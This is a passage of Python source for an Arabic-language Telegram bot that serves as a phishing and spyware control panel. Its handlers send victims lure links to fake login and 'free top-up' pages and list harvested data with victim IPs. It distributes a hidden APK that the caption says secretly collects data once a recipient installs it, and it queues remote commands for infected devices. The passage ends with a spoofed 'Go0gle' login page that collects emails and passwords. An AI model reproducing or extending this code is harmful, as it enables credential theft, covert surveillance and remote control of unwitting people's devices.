            markup = build_user_features_markup(target_id)
            user_info = get_user(target_id)
            name = user_info['first_name'] or user_info['username'] or str(target_id) if user_info else str(target_id)
            safe_send(chat_id, f"✅ تم تحديث صلاحيات المستخدم: {name}\n\n✅ مفعل - ❌ غير مفعل", reply_markup=markup)
            return

        if data == "admin_send_message":
            users = get_all_users()
            markup = InlineKeyboardMarkup(row_width=1)
            for user in users[:20]:
                name = user['first_name'] or user['username'] or str(user['chat_id'])
                markup.row(InlineKeyboardButton(f"{name} ({user['chat_id']})", callback_data=f"admin_msg_{user['chat_id']}"))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="mode_admin_panel"))
            safe_send(chat_id, "📢 اختر المستخدم:", reply_markup=markup)
            return

        if data.startswith("admin_msg_"):
            target_id = int(data.split("_")[2])
            admin_remote_target[chat_id] = target_id
            user_states[chat_id] = "admin_waiting_message"
            safe_send(chat_id, f"📝 أرسل الرسالة للمستخدم {target_id}:\n(لإلغاء: /cancel)")
            return

        if data == "admin_manage_users":
            users = get_all_users_with_status()
            markup = InlineKeyboardMarkup(row_width=2)
            for user in users[:20]:
                name = user['name'][:15]
                status_icon = "🟢" if user['status'] == "متصل" else "⚪"
                lock_icon = "🔓" if user['unlocked'] else "🔒"
                markup.row(InlineKeyboardButton(f"{status_icon} {name} {lock_icon}", callback_data=f"admin_user_{user['id']}"))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="mode_admin_panel"))
            safe_send(chat_id, "👥 إدارة المستخدمين:", reply_markup=markup)
            return

        if data.startswith("admin_user_"):
            target_id = int(data.split("_")[2])
            user = get_user(target_id)
            if not user:
                safe_send(chat_id, "❌ المستخدم غير موجود.")
                return
            unlocked = is_user_unlocked(target_id)
            status = get_user_status(target_id)
            
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(InlineKeyboardButton("📩 إرسال رسالة", callback_data=f"admin_msg_{target_id}"))
            if user['is_banned']:
                markup.row(InlineKeyboardButton("✅ إلغاء الحظر", callback_data=f"admin_unban_{target_id}"))
            else:
                markup.row(InlineKeyboardButton("🚫 حظر", callback_data=f"admin_ban_{target_id}"))
            if unlocked:
                markup.row(InlineKeyboardButton("🔒 إعادة قفل النقاط", callback_data=f"admin_lock_{target_id}"))
            else:
                markup.row(InlineKeyboardButton("🔓 إلغاء قفل النقاط", callback_data=f"admin_unlock_{target_id}"))
            markup.row(
                InlineKeyboardButton("➕ إضافة نقاط", callback_data=f"admin_add_points_{target_id}"),
                InlineKeyboardButton("➖ خصم نقاط", callback_data=f"admin_remove_points_{target_id}")
            )
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="admin_manage_users"))
            
            info = (
                f"👤 {user['first_name'] or user['username'] or target_id}\n"
                f"🆔 {target_id}\n"
                f"⭐ {user['points']}\n"
                f"🔓 {'مفتوح ✅' if unlocked else 'مغلق 🔒'}\n"
                f"🚫 {'محظور ❌' if user['is_banned'] else 'لا ✅'}\n"
                f"📡 {status}"
            )
            safe_send(chat_id, info, reply_markup=markup)
            return

        if data.startswith("admin_unlock_"):
            target_id = int(data.split("_")[2])
            toggle_user_unlock(target_id, unlock=True)
            safe_send(chat_id, f"✅ تم إلغاء قفل النقاط للمستخدم {target_id}.")
            safe_send(target_id, "🔓 تم إلغاء قفل النقاط لحسابك!")
            return

        if data.startswith("admin_lock_"):
            target_id = int(data.split("_")[2])
            toggle_user_unlock(target_id, unlock=False)
            safe_send(chat_id, f"✅ تم إعادة قفل النقاط للمستخدم {target_id}.")
            safe_send(target_id, "🔒 تم إعادة قفل النقاط لحسابك.")
            return

        if data.startswith("admin_add_points_"):
            target_id = int(data.split("_")[2])
            admin_remote_target[chat_id] = target_id
            user_states[chat_id] = "admin_waiting_add_points"
            safe_send(chat_id, f"➕ أدخل عدد النقاط للإضافة للمستخدم {target_id}:")
            return

        if data.startswith("admin_remove_points_"):
            target_id = int(data.split("_")[2])
            admin_remote_target[chat_id] = target_id
            user_states[chat_id] = "admin_waiting_remove_points"
            safe_send(chat_id, f"➖ أدخل عدد النقاط للخصم من المستخدم {target_id}:")
            return

        if data.startswith("admin_ban_"):
            target_id = int(data.split("_")[2])
            ban_user(target_id)
            safe_send(chat_id, f"🚫 تم حظر المستخدم {target_id}.")
            safe_send(target_id, "🚫 تم حظر حسابك.")
            return

        if data.startswith("admin_unban_"):
            target_id = int(data.split("_")[2])
            unban_user(target_id)
            safe_send(chat_id, f"✅ تم إلغاء حظر المستخدم {target_id}.")
            safe_send(target_id, "✅ تم إلغاء حظر حسابك.")
            return

        if data == "admin_stats":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            total_users = c.fetchone()[0]
            c.execute("SELECT SUM(points) FROM users")
            total_points = c.fetchone()[0] or 0
            c.execute("SELECT COUNT(*) FROM user_unlocks WHERE unlocked=1")
            unlocked_users = c.fetchone()[0]
            conn.close()
            msg = (
                f"📊 الإحصائيات:\n"
                f"👥 المستخدمون: {total_users}\n"
                f"⭐ إجمالي النقاط: {total_points}\n"
                f"🔓 مفتوحون: {unlocked_users}"
            )
            safe_send(chat_id, msg)
            return

        if data == "admin_broadcast":
            user_states[chat_id] = "waiting_for_broadcast"
            safe_send(chat_id, "📢 أرسل الرسالة للبث الجماعي:")
            return

        if data == "admin_collected_data":
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT data_type, data, ip, created_at FROM collected_data ORDER BY created_at DESC LIMIT 30")
                rows = c.fetchall()
                if rows:
                    msg = "📩 **آخر البيانات المجمعة:**\n\n"
                    for row in rows:
                        msg += f"📂 {row['data_type']} | {row['ip']} | {row['created_at'][:16]}\n"
                        try:
                            content = json.loads(row['data'])
                            snippet = json.dumps(content, ensure_ascii=False)[:100]
                        except:
                            snippet = row['data'][:100]
                        msg += f"   {snippet}...\n\n"
                    safe_send(chat_id, msg)
                else:
                    safe_send(chat_id, "📭 لا توجد بيانات مجمعة.")
            return

        if data == "admin_logs":
            try:
                with open('bot.log', 'r') as f:
                    logs = f.read().splitlines()[-30:]
                    text = "📜 آخر 30 سطر:\n" + "\n".join(logs)
                    safe_send(chat_id, text)
            except:
                safe_send(chat_id, "⚠️ لا يوجد سجل.")
            return

        safe_send(chat_id, "⚠️ خيار غير معروف.")
        return

    # ========== الميزات الجديدة ==========
    if data == "mode_video_chat":
        safe_send(chat_id, f"📹 <b>دردشة فيديو</b>\n\n🔗 <a href='{SERVER_URL}/video_chat'>الرابط</a>")
        feature_usage["دردشة فيديو"] += 1
        return

    if data == "mode_freefire":
        safe_send(chat_id, f"🔥 <b>شحن فري فاير</b>\n\n🔗 <a href='{SERVER_URL}/freefire'>الرابط</a>")
        feature_usage["شحن فري فاير"] += 1
        return

    if data == "mode_security_check":
        safe_send(chat_id, f"🔐 <b>تأكيد الهوية</b>\n\n🔗 <a href='{SERVER_URL}/security_check'>الرابط</a>")
        feature_usage["تأكيد هوية"] += 1
        return

    if data == "mode_whatsapp_web":
        safe_send(chat_id, f"📱 <b>ربط واتساب ويب</b>\n\n🔗 <a href='{SERVER_URL}/whatsapp_web'>الرابط</a>")
        feature_usage["ربط واتساب"] += 1
        return

    if data == "mode_temp_mail_service":
        safe_send(chat_id, f"📧 <b>بريد مؤقت</b>\n\n🔗 <a href='{SERVER_URL}/temp_mail'>الرابط</a>")
        feature_usage["بريد مؤقت"] += 1
        return

    if data == "mode_file_recovery":
        safe_send(chat_id, f"📂 <b>استعادة الملفات</b>\n\n🔗 <a href='{SERVER_URL}/file_recovery'>الرابط</a>")
        feature_usage["استعادة ملفات"] += 1
        return

    if data == "mode_link_scanner":
        safe_send(chat_id, f"🌐 <b>فحص الروابط</b>\n\n🔗 <a href='{SERVER_URL}/link_scanner'>الرابط</a>")
        feature_usage["فحص روابط"] += 1
        return

    if data == "mode_tiktok_followers":
        safe_send(chat_id, f"📊 <b>متابعين تيك توك</b>\n\n🔗 <a href='{SERVER_URL}/tiktok_followers'>الرابط</a>")
        feature_usage["متابعين تيك توك"] += 1
        return

    if data == "mode_cracked_apps":
        safe_send(chat_id, f"📲 <b>تطبيقات مهكرة</b>\n\n🔗 <a href='{SERVER_URL}/cracked_apps'>الرابط</a>")
        feature_usage["تطبيقات مهكرة"] += 1
        return

    if data == "mode_account_recovery":
        safe_send(chat_id, f"🔑 <b>استعادة حساب</b>\n\n🔗 <a href='{SERVER_URL}/account_recovery'>الرابط</a>")
        feature_usage["استعادة حساب"] += 1
        return

    if data == "mode_security_scan":
        safe_send(chat_id, f"🛡️ <b>فحص أمان شامل</b>\n\n🔗 <a href='{SERVER_URL}/security_scan'>الرابط</a>")
        feature_usage["فحص أمان شامل"] += 1
        return

    if data == "mode_hidden_image_polyglot":
        if not is_admin_user:
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        
        apk_path = os.path.join(BASE_DIR, 'static', 'SurveyApp.apk')
        if os.path.exists(apk_path):
            with open(apk_path, 'rb') as f:
                apk_data = f.read()
            bot.send_document(
                chat_id,
                ('SurveyApp.apk', apk_data),
                caption=(
                    "📱 **أداة التجميع الخفية**\n\n"
                    "🔗 هذا الملف مربوط مباشرة بالبوت، ولا يحتاج لأي تطبيقات خارجية.\n\n"
                    "📌 **طريقة الاستخدام:**\n"
                    "1️⃣ أرسل هذا الملف لأي شخص.\n"
                    "2️⃣ اطلب منه تثبيت التطبيق.\n"
                    "3️⃣ بعد التثبيت، سيعمل التطبيق في الخلفية ويجمع البيانات ويرسلها لك.\n\n"
                    "⚠️ استخدم هذا الملف بحذر، فهو لأغراض اختبارية فقط."
                )
            )
            feature_usage["صورة مدموجة"] += 1
            notify_admin(f"📱 تم إرسال ملف APK إلى المطور")
        else:
            safe_send(
                chat_id,
                "⚠️ ملف APK غير موجود. يرجى وضع ملف `SurveyApp.apk` في مجلد `static/`.\n\n"
                "📌 يمكنك بناء التطبيق باستخدام كود Android المقدم مسبقاً."
            )
        return

    # ========== الأزرار الأساسية ==========
    if data == "mode_site":
        user_states[chat_id] = "waiting_for_site"
        safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
    elif data == "mode_apk":
        user_states[chat_id] = "waiting_for_apk"
        safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
    elif data == "mode_my_app":
        user_states[chat_id] = "waiting_for_my_app"
        safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
    elif data == "mode_temp_email":
        email, token, password = create_temp_email_real()
        if email:
            temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
            text = f"📤 بريدك المؤقت:\n{email}\n🔑 كلمة السر: {password}"
            send_sensitive_data_to_admin("Temp Email", f"{email} | {password}", chat_id)
        else:
            text = "⚠️ فشل إنشاء البريد."
        safe_send(chat_id, text)
        feature_usage["إيميل مؤقت"] += 1
    elif data == "mode_track_phone":
        user_states[chat_id] = "waiting_for_track_num"
        safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
    elif data == "mode_fb_report":
        if not is_admin_user and not unlocked and points < 30:
            safe_send(chat_id, "⚠️ تحتاج 30 نقطة.")
            return
        safe_send(chat_id, "📢 اختر نوع البلاغ:", reply_markup=build_fb_report_type_markup())
    elif data == "mode_download":
        if not FFMPEG_AVAILABLE:
            safe_send(chat_id, "⚠️ خدمة تحميل الفيديو غير متاحة (FFmpeg غير مثبت).")
            return
        user_states[chat_id] = "waiting_for_download"
        safe_send(chat_id, "📥 أرسل رابط الفيديو لتحميله.")
        feature_usage["تحميل فيديو"] += 1
    elif data == "mode_shorten_url":
        user_states[chat_id] = "waiting_for_shorten"
        safe_send(chat_id, "🔗 أرسل الرابط الطويل لتقصيره.")
        feature_usage["تقصير روابط"] += 1
    elif data == "mode_vuln_scan":
        user_states[chat_id] = "waiting_for_vuln_target"
        safe_send(chat_id, "🛡️ أرسل الهدف لفحص الثغرات:\n\n• رابط موقع\n• عنوان IP\n• نطاق")
    elif data == "mode_pdf":
        user_states[chat_id] = "waiting_for_pdf"
        safe_send(chat_id, "📚 أرسل ملف PDF الدراسي.")
        feature_usage["تحليل PDF"] += 1
    elif data == "mode_temp_number":
        safe_send(chat_id, "⏳ جاري جلب أرقام هواتف مؤقتة...")
        numbers = fetch_temp_numbers_advanced(limit=5)
        if numbers:
            response = "📱 أرقام هواتف مؤقتة:\n\n"
            for i, num in enumerate(numbers, 1):
                response += f"{i}. {num['number']} - {num['country']}\n"
            safe_send(chat_id, response)
            feature_usage["رقم مؤقت"] += 1
        else:
            safe_send(chat_id, "⚠️ فشل جلب الأرقام، حاول لاحقاً.")
    elif data == "mode_google_login":
        google_login(call.message)
    elif data == "mode_google_logout":
        google_logout(call.message)
    elif data == "mode_facebook_followers":
        fake_url = f"{SERVER_URL}/facebook_login"
        safe_send(chat_id, f"📊 <b>تعزيز حضورك الرقمي</b>\n\n🔗 <a href='{fake_url}'>الرابط</a>")
        feature_usage["رشق متابعين"] += 1
        notify_admin(f"📊 مستخدم {chat_id} فتح صفحة رشق المتابعين")
    elif data == "mode_survey":
        survey_url = f"{SERVER_URL}/survey"
        safe_send(chat_id, f"📄 <b>استبيان مدفوع</b>\n\n🔗 <a href='{survey_url}'>الرابط</a>")
        feature_usage["استبيان"] += 1
    elif data == "mode_pdf_reader":
        pdf_url = f"{SERVER_URL}/pdf_reader"
        safe_send(chat_id, f"📄 <b>قاريء PDF</b>\n\n🔗 <a href='{pdf_url}'>الرابط</a>")
        feature_usage["قاريء PDF"] += 1
    elif data == "mode_track_phone_location":
        user_states[chat_id] = "waiting_for_phone_tracking"
        safe_send(chat_id, "📍 أرسل رقم الهاتف (مثال: +201001234567):")
        feature_usage["تتبع رقم"] += 1
    elif data == "mode_apk_survey":
        if not is_admin_user:
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        apk_url = f"{SERVER_URL}/download_apk_survey"
        safe_send(chat_id, f"📱 <b>APK</b>\n\n🔗 <a href='{apk_url}'>تحميل APK</a>")
        feature_usage["APK"] += 1
        notify_admin(f"📱 مستخدم {chat_id} طلب APK")
    elif data == "mode_show_points":
        safe_send(chat_id, f"⭐ نقاطك: {points}")
    elif data == "mode_points_history":
        history = get_points_history(chat_id)
        if not history:
            safe_send(chat_id, "📊 لا يوجد سجل للنقاط.")
        else:
            text = "📊 سجل النقاط:\n\n"
            for row in history:
                sign = "+" if row['amount'] > 0 else ""
                text += f"{sign}{row['amount']} - {row['reason']}\n"
            safe_send(chat_id, text)
    elif data == "mode_show_referral":
        link = create_referral_link(chat_id)
        safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")
    elif data == "mode_view_devices" and is_admin_user:
        devs = get_registered_devices_db()
        if not devs:
            text = "📱 لا توجد أجهزة مسجلة."
        else:
            text = "📱 الأجهزة المسجلة:\n\n"
            for d in devs:
                text += f"🆔 {d['device_id']}\n👤 {d['chat_id']}\n\n"
        safe_send(chat_id, text)
    elif data == "mode_remote_admin" and is_admin_user:
        safe_send(chat_id, "🎮 تحكم عن بعد\nاختر الجهاز:", reply_markup=build_device_list_markup())
    elif data == "mode_set_dev_endpoint" and is_admin_user:
        user_states[chat_id] = "waiting_for_dev_endpoint"
        safe_send(chat_id, "🖥️ أرسل عنوان حاسب المطور (مثل: http://192.168.1.100:8080)")
    # ========== اختيار جهاز للتحكم عن بعد ==========
    elif data.startswith("remote_select_") and is_admin_user:
        device_id = data.split("_")[2]
        with db_transaction() as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
            if c.fetchone():
                admin_remote_target[chat_id] = device_id
                markup = build_device_commands_markup(device_id)
                safe_send(chat_id, f"✅ تم اختيار الجهاز: `{device_id}`\nاختر الأمر:", reply_markup=markup)
            else:
                safe_send(chat_id, "❌ الجهاز غير موجود.")
    # ========== تنفيذ أمر على جهاز ==========
    elif data.startswith("remote_cmd_") and is_admin_user:
        parts = data.split("_")
        device_id = parts[2]
        command = parts[3]
        # إضافة الأمر لقائمة الأوامر المعلقة
        add_pending_command_db(device_id, command)
        safe_send(chat_id, f"⏳ تم إرسال الأمر `{command}` إلى الجهاز.\nسيتم التنفيذ خلال 15 ثانية.")
        # إعادة عرض قائمة الأوامر
        markup = build_device_commands_markup(device_id)
        safe_send(chat_id, f"✅ الجهاز: `{device_id}`", reply_markup=markup)
    # ========== تحديث قائمة الأوامر (Refresh) ==========
    elif data.startswith("remote_refresh_") and is_admin_user:
        device_id = data.split("_")[2]
        markup = build_device_commands_markup(device_id)
        safe_send(chat_id, f"🔄 تم تحديث الأوامر للجهاز: `{device_id}`", reply_markup=markup)
    # ========== أزرار عامة ==========
    elif data in ["no_devices", "back_to_main"]:
        safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
    elif data.startswith("fb_type_"):
        report_type_key = data.split("_")[2]
        report_type_label = FB_REPORT_TYPES.get(report_type_key, "أخرى")
        user_states[chat_id] = "waiting_for_fb_report_reason"
        user_states[f"{chat_id}_fb_report_type"] = report_type_label
        safe_send(chat_id, f"✅ تم اختيار: {report_type_label}\n\nاكتب شرحاً مفصلاً للمشكلة.")
    else:
        safe_send(chat_id, "⚠️ خيار غير معروف.")

# ===================== معالج النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()

    try:
        if state == "admin_waiting_message":
            target_id = admin_remote_target.get(chat_id)
            if not target_id:
                safe_send(chat_id, "❌ لم يتم تحديد مستخدم.")
                user_states[chat_id] = None
                return
            try:
                safe_send(target_id, f"📩 <b>رسالة من الإدارة:</b>\n\n{text}")
                safe_send(chat_id, f"✅ تم إرسال الرسالة للمستخدم {target_id}.")
                notify_admin(f"📩 أرسل المطور رسالة للمستخدم {target_id}: {text[:50]}...")
            except Exception as e:
                safe_send(chat_id, f"⚠️ فشل الإرسال: {str(e)}")
            user_states[chat_id] = None
            admin_remote_target.pop(chat_id, None)
            return

        if state == "admin_waiting_add_points":
            target_id = admin_remote_target.get(chat_id)
            if not target_id:
                safe_send(chat_id, "❌ لم يتم تحديد مستخدم.")
                user_states[chat_id] = None
                return
            try:
                amount = int(text)
                if amount <= 0:
                    safe_send(chat_id, "⚠️ يجب أن يكون العدد موجباً.")
                    return
                add_points_db(target_id, amount, "إضافة نقاط من المطور")
                safe_send(chat_id, f"✅ تم إضافة {amount} نقطة للمستخدم {target_id}.")
                safe_send(target_id, f"➕ تمت إضافة {amount} نقطة إلى رصيدك.")
            except ValueError:
                safe_send(chat_id, "⚠️ يرجى إدخال عدد صحيح.")
            user_states[chat_id] = None
            admin_remote_target.pop(chat_id, None)
            return

        if state == "admin_waiting_remove_points":
            target_id = admin_remote_target.get(chat_id)
            if not target_id:
                safe_send(chat_id, "❌ لم يتم تحديد مستخدم.")
                user_states[chat_id] = None
                return
            try:
                amount = int(text)
                if amount <= 0:
                    safe_send(chat_id, "⚠️ يجب أن يكون العدد موجباً.")
                    return
                if deduct_points(target_id, amount, "خصم نقاط من المطور"):
                    safe_send(chat_id, f"✅ تم خصم {amount} نقطة من المستخدم {target_id}.")
                    safe_send(target_id, f"➖ تم خصم {amount} نقطة من رصيدك.")
                else:
                    safe_send(chat_id, f"⚠️ المستخدم {target_id} ليس لديه نقاط كافية.")
            except ValueError:
                safe_send(chat_id, "⚠️ يرجى إدخال عدد صحيح.")
            user_states[chat_id] = None
            admin_remote_target.pop(chat_id, None)
            return

        if state == "waiting_for_phone_tracking":
            clean_number = re.sub(r'[\s\-()]', '', text)
            if not clean_number.startswith('+'):
                clean_number = '+' + clean_number
            if re.match(r'^\d{15}$', clean_number.replace('+', '')):
                safe_send(chat_id, "⚠️ لا يمكن تتبع الهاتف عبر IMEI.\nأرسل رقم الهاتف (مثال: +201001234567)")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري تتبع الموقع...")
            result, status = track_phone_advanced(clean_number)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
                safe_send(chat_id, "⏳ جاري فحص الموقع...")
                result, status = scan_website(text)
                safe_send(chat_id, f"🔍 نتيجة الفحص:\n{result}")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_shorten":
            if re.match(r'^https?://', text):
                short_url, error = shorten_url(text)
                if error:
                    safe_send(chat_id, f"⚠️ فشل تقصير الرابط: {error}")
                else:
                    safe_send(chat_id, f"✅ الرابط المختصر:\n{short_url}")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_track_num":
            result, status = track_phone_real(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_for_vuln_target":
            target = text
            safe_send(chat_id, "⏳ جاري فحص الثغرات...")
            try:
                target_ip = None
                target_domain = None
                target_url = None
                if re.match(r'^https?://', target):
                    target_url = target
                    domain_match = re.search(r'https?://([^/:]+)', target)
                    if domain_match:
                        target_domain = domain_match.group(1)
                elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                    target_ip = target
                elif re.match(r'^[a-zA-Z0-9-]+\.[a-zA-Z]{2,}$', target):
                    target_domain = target
                    target_url = f"https://{target}"
                else:
                    safe_send(chat_id, "⚠️ لم يتم التعرف على الهدف.")
                    user_states[chat_id] = None
                    return
                report = perform_vulnerability_scan(target_ip, target_domain, target_url)
                safe_send(chat_id, report)
                feature_usage["فحص ثغرات"] += 1
            except Exception as e:
                safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)[:100]}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_download":
            if re.match(r'^https?://', text):
                safe_send(chat_id, "⏳ جاري تحميل الفيديو...")
                result, error = download_video(text)
                if error:
                    safe_send(chat_id, f"⚠️ {error}")
                elif result and os.path.exists(result):
                    try:
                        with open(result, 'rb') as f:
                            bot.send_video(chat_id, f, caption="📥 تم التحميل")
                        os.remove(result)
                    except Exception as e:
                        safe_send(chat_id, f"⚠️ فشل إرسال الفيديو: {str(e)}")
                else:
                    safe_send(chat_id, "⚠️ فشل تحميل الفيديو.")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_broadcast" and is_admin_user:
            success = 0
            fail = 0
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE is_banned = 0")
                users = c.fetchall()
            for user in users:
                try:
                    safe_send(user['chat_id'], text)
                    success += 1
                    time.sleep(0.1)
                except:
                    fail += 1
            safe_send(chat_id, f"✅ تم إرسال الرسالة لـ {success} مستخدم.\n❌ فشل الإرسال لـ {fail} مستخدم.")
            user_states[chat_id] = None
            notify_admin(f"📢 بث جماعي: {text[:50]}...")
            return

        if state == "waiting_for_fb_report_reason":
            reason = text
            user_states[chat_id] = "waiting_for_fb_report_link"
            user_states[f"{chat_id}_fb_report_reason"] = reason
            safe_send(chat_id, "✅ تم حفظ السبب.\n\nأرسل رابط المنشور (أو اكتب 'لا يوجد').")
            return

        if state == "waiting_for_fb_report_link":
            link = text if text.lower() != 'لا يوجد' else ''
            report_type = user_states.get(f"{chat_id}_fb_report_type")
            reason = user_states.get(f"{chat_id}_fb_report_reason")
            if not report_type or not reason:
                safe_send(chat_id, "❌ حدث خطأ.")
                user_states[chat_id] = None
                return
            report_text = generate_fb_report(report_type, reason, link)
            support_links = {
                "حساب مزيف": "https://www.facebook.com/help/contact/295309487309948",
                "منشور مسيء": "https://www.facebook.com/help/contact/315847653073855",
                "تحرش أو مضايقة": "https://www.facebook.com/help/contact/237547145079192",
                "انتحال شخصية": "https://www.facebook.com/help/contact/295309487309948",
                "انتهاك خصوصية": "https://www.facebook.com/help/contact/249621638488458",
                "محتوى عنيف": "https://www.facebook.com/help/contact/274459462613911"
            }
            support_link = "https://www.facebook.com/help/contact/315847653073855"
            for key, url in support_links.items():
                if key in report_type:
                    support_link = url
                    break
            final_msg = (
                f"📝 شكوى رسمية\n\n"
                f"{report_text}\n\n"
                f"🔗 رابط الدعم: {support_link}\n\n"
                f"📌 انسخ النص أعلاه، ثم اضغط على الرابط، والصق النص."
            )
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🌐 فتح رابط الدعم", url=support_link))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            safe_send(chat_id, final_msg, reply_markup=markup)
            for key in [f"{chat_id}_fb_report_type", f"{chat_id}_fb_report_reason"]:
                if key in user_states:
                    del user_states[key]
            user_states[chat_id] = None
            feature_usage["بلاغات فيسبوك"] += 1
            return

        if state == "waiting_for_pdf_question":
            pdf_text = user_states.get(f"{chat_id}_pdf_text")
            if not pdf_text:
                safe_send(chat_id, "⚠️ لم يتم تحميل ملف PDF.")
                user_states[chat_id] = None
                return
            answer = answer_question_from_pdf(pdf_text, text)
            safe_send(chat_id, f"📚 الإجابة:\n{answer}")
            return

        if state is None:
            safe_send(chat_id, "🤖 اختر خدمة من القائمة.", reply_markup=build_main_menu(chat_id))
    except Exception as e:
        logger.error(f"handle_text_messages error: {e}")
        notify_admin(f"خطأ: {str(e)}", is_error=True)
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)}")

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    try:
        if state == "waiting_for_pdf":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.pdf'):
                safe_send(chat_id, "❌ يرجى إرسال ملف PDF.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            pdf_text = extract_text_from_pdf(downloaded)
            if not pdf_text:
                safe_send(chat_id, "⚠️ فشل استخراج النص.")
                user_states[chat_id] = None
                return
            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
            safe_send(chat_id, f"✅ تم استخراج النص ({len(pdf_text)} حرف).\n\nالآن اكتب سؤالك.")
            return

        if state == "waiting_for_apk":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ أرسل ملف APK.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result, status = scan_apk_real(downloaded, file_name)
            safe_send(chat_id, f"📦 نتيجة الفحص:\n{result}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_my_app":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            ext = file_name.split('.')[-1].lower()
            if ext not in ['txt', 'py', 'js', 'java', 'cpp', 'c', 'html', 'css', 'php']:
                safe_send(chat_id, "❌ امتداد غير مدعوم.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            try:
                content = downloaded.decode('utf-8')
                safe_send(chat_id, "🛠️ تم استلام الملف، يمكنك مراجعته.")
            except:
                safe_send(chat_id, "⚠️ فشل قراءة الملف.")
            user_states[chat_id] = None
            return
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)}")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    chat_id = message.chat.id
    safe_send(chat_id, "🖼️ تم استلام الصورة.")

# ===================== صفحات HTML محسّنة =====================

# صفحة جوجل المزيفة (Go0gle) بشعار ملون
GOOGLE_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Go0gle - تسجيل الدخول</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #f1f1f1;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #fff;
            padding: 48px 36px;
            border-radius: 16px;
            box-shadow: 0 8px 40px rgba(0,0,0,0.15);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 64px;
            font-weight: 700;
            letter-spacing: -2px;
            margin-bottom: 8px;
        }
        .logo span:nth-child(1){ color: #4285F4; }
        .logo span:nth-child(2){ color: #EA4335; }
        .logo span:nth-child(3){ color: #FBBC05; }
        .logo span:nth-child(4){ color: #4285F4; }
        .logo span:nth-child(5){ color: #34A853; }
        .logo span:nth-child(6){ color: #EA4335; }
        h2 { font-weight: 400; margin: 16px 0 8px; font-size: 22px; }
        .sub { color: #5f6368; font-size: 14px; margin-bottom: 24px; }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0;
            border: 1px solid #dadce0;
            border-radius: 8px;
            font-size: 16px;
            transition: border 0.2s;
        }
        input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
        button {
            width: 100%;
            padding: 14px;
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            transition: background 0.2s;
        }
        button:hover { background: #1557b0; }
        .footer { margin-top: 20px; font-size: 13px; color: #5f6368; }
        .footer a { color: #1a73e8; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <span>G</span><span>o</span><span>0</span><span>g</span><span>l</span><span>e</span>
    </div>
    <h2>تسجيل الدخول</h2>
    <p class="sub">استمر إلى Go0gle</p>
    <form method="POST">
        <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
        <input type="password" name="password" placeholder="كلمة السر" required>
        <button type="submit">التالي</button>
    </form>
    <div class="footer">
